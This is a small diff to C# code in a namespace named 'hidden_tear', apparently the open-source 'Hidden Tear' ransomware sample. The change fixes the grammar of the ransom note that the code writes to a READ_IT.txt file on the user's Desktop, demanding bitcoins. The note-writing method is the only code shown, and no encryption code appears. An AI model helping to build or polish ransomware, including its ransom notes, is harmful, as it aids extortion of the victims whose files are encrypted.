@@ -185,7 +185,7 @@ namespace hidden_tear
         {
             string path = "\\Desktop\\test\\READ_IT.txt";
             string fullpath = userDir + userName + path;
-            string[] lines = { "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." };
+            string[] lines = { "Files have been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." };
             System.IO.File.WriteAllLines(fullpath, lines);
         }
     }
